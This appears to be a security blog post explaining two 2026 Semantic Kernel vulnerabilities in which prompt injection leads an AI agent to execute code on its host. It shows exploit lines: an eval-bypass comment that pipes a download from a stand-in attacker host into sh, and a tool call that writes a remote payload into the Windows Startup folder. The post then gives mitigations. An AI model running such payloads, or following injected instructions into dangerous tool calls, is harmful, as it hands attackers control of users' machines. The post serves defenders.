---
title: "Semantic Kernel Agent RCE Vulnerabilities Guide 2026: When Prompt Injection Becomes Code Execution"
date: 2026-07-07
draft: false
description: "A technical breakdown of CVE-2026-26030 and CVE-2026-25592 — two critical RCE vulnerabilities in Microsoft's Semantic Kernel that turned prompt injection into host compromise. Includes exploit mechanics, mitigation steps, and lessons for every agent framework."
tags: ["Semantic Kernel", "RCE", "CVE-2026-26030", "CVE-2026-25592", "prompt injection", "agent security", "Microsoft", "AI security"]
categories: ["AI Security"]
slug: "semantic-kernel-agent-rce-vulnerabilities-guide-2026"
---

If you're building AI agents with Microsoft's Semantic Kernel, stop and check your version right now. Two critical vulnerabilities — CVE-2026-26030 (CVSS 9.9) and CVE-2026-25592 (CVSS 9.9) — turn prompt injection from a content-quality annoyance into a full host compromise primitive. I've spent the last few weeks digging into both exploits, and the implications go far beyond Semantic Kernel itself.

Here's the uncomfortable truth: **AI models are not security boundaries**. Every parameter an LLM can influence when calling a tool is attacker-controlled input. If your framework passes that input to `eval()`, a file write function, or a shell command without validation, you've built a remote code execution vector that only needs a cleverly crafted prompt to trigger.

## The Two Vulnerabilities at a Glance

| CVE | Component | CVSS | Attack Vector | Patched In |
|-----|-----------|------|---------------|------------|
| CVE-2026-26030 | Python SDK `InMemoryVectorStore` | 9.9 (Critical) | Prompt injection → search filter → `eval()` → RCE | `python-1.39.4` |
| CVE-2026-25592 | .NET SDK `SessionsPythonPlugin` | 9.9 (Critical) | Prompt injection → `DownloadFileAsync` → arbitrary file write → RCE | `1.71.0` |

Both were disclosed in early 2026. Both earned a 9.9 CVSS because they require no special privileges, no user interaction beyond the initial prompt, and the impact is total host compromise.

## CVE-2026-26030: The Python eval() Sink

This one is the more technically interesting of the two. Semantic Kernel's `InMemoryVectorStore` — a vector store used for in-memory semantic search — accepts a `filter` parameter that gets converted into a Python lambda expression and passed to `eval()`.

Here's the chain:

1. An attacker crafts a prompt that tells the agent to search the vector store with a malicious filter string
2. The filter string is interpolated into a lambda: `lambda x: {filter_string}`
3. That lambda string is passed to Python's built-in `eval()`
4. The original code had an AST blocklist — it tried to block dangerous operations by checking the parsed AST for forbidden node types
5. The bypass: traverse Python's class hierarchy via `BuiltinImporter` → `load_module` → `os.system`

The AST blocklist approach is the classic security mistake in dynamic languages. Python's object model is too rich to blocklist effectively. The fix in `python-1.39.4` replaces it with an allowlist approach: only specific AST node types are permitted, function calls are restricted to an explicit allowlist, and dangerous attribute access is blocked at the AST level rather than at runtime.

```python
# Vulnerable pattern (simplified)
def _build_lambda(filter_string: str):
    # AST blocklist — fragile by design
    tree = ast.parse(f"lambda x: {filter_string}")
    for node in ast.walk(tree):
        if type(node) in BLOCKLIST:
            raise ValueError("Forbidden construct")
    return eval(compile(tree, "<string>", "eval"))

# Bypass: BuiltinImporter.load_module("os").system("curl http://attacker/payload | sh")
```

The bypass works because `BuiltinImporter` is a built-in class that can load arbitrary modules. The AST blocklist didn't account for class hierarchy traversal — you don't need `import` or `__import__` when you can walk up the type hierarchy of any accessible object to find `BuiltinImporter`, call `load_module("os")`, and then call `system()`.

**If you're using `InMemoryVectorStore` in production, stop.** It was never designed for untrusted input. The patched version is safer, but the fundamental design — building executable code from string interpolation — is something I'd avoid entirely for any store that processes AI-generated content.

## CVE-2026-25592: The Accidental KernelFunction

This one is almost comical in its simplicity. Semantic Kernel's .NET `SessionsPythonPlugin` has a `DownloadFileAsync` method that downloads a file from a URL to a local path. Someone marked it with `[KernelFunction]` — the attribute that exposes a method as an AI-callable tool.

That's it. No authentication check. No path validation. No confirmation dialog. An AI agent can call `DownloadFileAsync` with any URL and any local file path, and the framework happily writes the file.

The attack scenario on Windows is straightforward:

1. Prompt injection tells the agent to download a malicious executable
2. The agent calls `DownloadFileAsync("http://attacker/payload.exe", "C:\\Users\\Victim\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\payload.exe")`
3. Next time the user signs in, the payload executes

The fix in `1.71.0` does two things: removes the `[KernelFunction]` attribute from `DownloadFileAsync`, and adds `ValidateLocalPathForDownload()` that checks the destination path against an allowlist of permitted directories.

```csharp
// Before (vulnerable)
[KernelFunction]
public async Task DownloadFileAsync(string url, string localFilePath)
{
    using var client = new HttpClient();
    var data = await client.GetByteArrayAsync(url);
    await File.WriteAllBytesAsync(localFilePath, data);
}

// After (patched in 1.71.0)
// [KernelFunction] removed entirely
// Path validation added
private string ValidateLocalPathForDownload(string path)
{
    // Only allow paths under a configured safe directory
}
```

The lesson here applies to every framework: **every public method annotated as a tool is a potential attack surface**. Before you add `[KernelFunction]`, `@tool`, or `@agent_function` to a method, ask yourself: "What happens if an attacker controls every parameter of this method?"

## Why These Matter Beyond Semantic Kernel

Semantic Kernel has 27,000+ GitHub stars and is embedded in Microsoft 365 Copilot, Azure Container Apps dynamic sessions, and countless enterprise RAG applications. But the vulnerability class isn't unique to Microsoft's framework.

LangChain had similar issues with `eval()` in its early Python REPL tool. CrewAI's tool system passes model-generated parameters directly to function calls. AutoGen's code execution sandbox has been [bypassed multiple times](https://baeseokjae.github.io/posts/semantic-kernel-autogen-migration-agent-framework-2026/). Every agent framework that wires LLM outputs to tool calls without parameter validation has the same fundamental problem.

The pattern is always the same:

1. Framework exposes a tool that takes a string parameter
2. The LLM generates the parameter value based on user + system prompt
3. Prompt injection contaminates the parameter
4. The framework passes the contaminated parameter to a sensitive sink (`eval()`, file write, shell command)
5. Host compromise

I covered [prompt injection defense patterns](https://baeseokjae.github.io/posts/clean-repo-prompt-injection-defense-guide-2026/) in a previous post, but these CVEs raise the stakes. Prompt injection isn't just about leaking context or generating offensive content anymore — it's a code execution primitive.

## Mitigation Checklist

If you're running Semantic Kernel today, here's your action plan:

**Immediate (today):**
- [ ] Upgrade Python SDK to `>=1.39.4`
- [ ] Upgrade .NET SDK to `>=1.71.0`
- [ ] Audit all `[KernelFunction]` / `@kernel_function` annotations in your codebase
- [ ] Check for any `eval()`, `exec()`, or `compile()` calls in your plugin code

**Short-term (this week):**
- [ ] Implement Function Invocation Filters for all file I/O operations
- [ ] Add runtime monitoring for suspicious child processes (cmd.exe, powershell, python -c) spawned by agent host processes
- [ ] Review your vector store choice — `InMemoryVectorStore` should not be in production pipelines
- [ ] Set up Microsoft Defender advanced hunting queries for post-exploitation indicators (the Microsoft Security Blog post from May 7 has specific KQL queries)

**Ongoing:**
- [ ] Treat all AI-influenced parameters as untrusted input — validate, sanitize, and allowlist
- [ ] Prefer allowlist-based validation over blocklist-based for every security check
- [ ] Run [agent security tooling](https://baeseokjae.github.io/posts/ai-agent-security-tools-2026/) in your CI pipeline to catch exposed tool surfaces
- [ ] Monitor the [agent supply chain](https://baeseokjae.github.io/posts/agent-skills-supply-chain-security-guide-2026/) — third-party plugins and skills are common sources of accidentally exposed functions

## The Bigger Picture

What makes these CVEs a watershed moment is that they close the loop on a threat model that the industry has been hand-waving about for two years. We've known prompt injection was theoretically dangerous. Now we have concrete proof that it can lead to RCE in the most widely-used enterprise agent framework.

The Microsoft Security Blog post from May titled "When prompts become shells" isn't hyperbole — it's an accurate description of the new reality. Every agent framework needs to treat the tool boundary as a trust boundary, with the same rigor we apply to API endpoints exposed to the internet.

The frameworks that survive this shift will be the ones that build security into the tool abstraction layer itself — not as an afterthought, but as a first-class concern. Parameter validation, capability-based access control, and explicit allowlists for sensitive operations need to be framework features, not something every developer has to implement from scratch.

For now, patch your Semantic Kernel instances, audit your tool annotations, and start treating every parameter the LLM touches as potentially malicious. The era of "prompt injection is just a content issue" is over.
